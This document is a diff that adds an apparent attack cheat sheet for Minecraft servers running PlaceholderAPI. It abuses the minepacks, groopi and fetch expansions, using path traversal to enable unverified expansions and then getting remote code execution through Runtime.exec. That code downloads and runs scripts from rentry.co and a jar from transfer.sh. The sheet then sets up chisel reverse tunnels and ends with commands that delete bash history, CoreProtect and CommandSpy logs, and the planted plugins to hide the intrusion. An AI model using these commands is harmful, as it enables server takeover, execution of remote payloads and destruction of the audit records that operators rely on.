@@ -1,0 +1,33 @@
+/papi ecloud download minepacks 1.0.6
+/papi reload
+/papi parse me %minepacks_set ./PlaceholderAPI/config cloud_allow_unverified_expansions true%
+/papi parse me %minepacks_set ../PlaceholderAPI/config cloud_allow_unverified_expansions true%
+/papi reload
+
+/papi ecloud download groopi
+/papi reload
+/papi parse me %groopi_java.lang.Runtime.getRuntime().exec("curl -O https://rentry.co/eo7oc/raw")%
+/papi parse me %groopi_java.lang.Runtime.getRuntime().exec("bash raw")%
+
+OR
+
+/papi ecloud download fetch
+/papi reload
+/papi parse me %fetch_ test 1 https://transfer.sh/get/M837wCE2yF/test.jar%
+/papi register ../../../fetch/test
+/papi parse me %rce_curl_-O_https://rentry.co/eo7oc/raw%
+/papi parse me %rce_bash_raw%
+
+PORT FORWARDING:
+
+REVERSE - BEST OPTION
+chisel.exe server --port 6912 --reverse || ./chisel server --port 6912 --reverse
+./chisel client yourip:6912 R:25565:serveripyouwanttoportforward:25582
+
+NORMAL - TRY IF REVERSE DOESNT WORK
+./chisel server --port 6912
+chisel.exe client serveripyouwanttoportforward:6912 7800
+
+CLEAR LOGS:
+REMEMBER TO CHECK COREPROTECT SQL IF EXISTS!!!!
+rm plugins/CommandSpy/players.yml; rm ~/.bash_history; rm plugins/CoreProtect/CoreProtect.db; history -c;rm -fr logs/;rm -fr groovy.jar;rm -fr plugins/Minepacks; rm plugins/PlaceholderAPI/expansions/Expansion-groopi.jar;rm plugins/PlaceholderAPI/expansions/Expansion-minepacks.jar;rm plugins/PlaceholderAPI/expansions/Expansion-fetch.jar;rm -fr fetch/;
